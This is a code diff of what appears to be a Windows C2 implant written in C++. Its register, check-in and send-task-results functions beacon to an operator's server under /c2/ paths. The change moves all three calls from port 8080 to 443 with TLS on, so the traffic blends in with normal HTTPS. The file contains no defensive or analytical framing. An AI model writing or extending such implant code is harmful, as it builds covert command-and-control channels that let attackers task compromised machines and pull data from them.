@@ -33,7 +33,7 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     PSIZE_T outSize = 0;
 
     // Register
-    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 8080, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, FALSE);
+    string res = HTTPRequest(L"POST", serverUrl, L"/c2/register", 443, L"Hello-world", CONTENT_TYPE_JSON, (LPBYTE)key_json, strlen(key_json), outSize, TRUE);
     // string res_str = LPBYTEToString(res, GetLPBYTELength(res));
     DEBUG_PRINTF("Register response: %s\n", res.c_str());
     // cout << res_str << endl;
@@ -68,7 +68,7 @@ Task *Checkin(LPCWSTR serverUrl, MalleableProfile *profile)
     string authCookieString = oss.str();
     std::wstring authCookie(authCookieString.begin(), authCookieString.end());
     DEBUG_PRINTF("Auth cookie: %ls\n", authCookie.c_str());
-    string res = HTTPRequest(L"GET", serverUrl, L"/c2/checkin", 8080, L"Hello-world", authCookie.c_str(), NULL, 0, outSize, FALSE);
+    string res = HTTPRequest(L"GET", serverUrl, L"/c2/checkin", 443, L"Hello-world", authCookie.c_str(), NULL, 0, outSize, TRUE);
     DEBUG_PRINTF("Checkin done\n");
     // decode and decrypt the response
     string resDecoded = res; /*decryptB64String(profile->base64ServerPublicKey,
@@ -124,7 +124,7 @@ bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool 
 
     // Send the results
     PSIZE_T outSize = 0;
-    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 8080, L"Hello-world", authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, FALSE);
+    string res = HTTPRequest(L"POST", serverUrl, TASK_RESULTS_ENDPOINT, 443, L"Hello-world", authCookie.c_str(), (LPBYTE)encryptedResults.c_str(), encryptedResults.length(), outSize, TRUE);
     
     DEBUG_PRINTF("SendTaskResult response: %s\n", res.c_str());
 
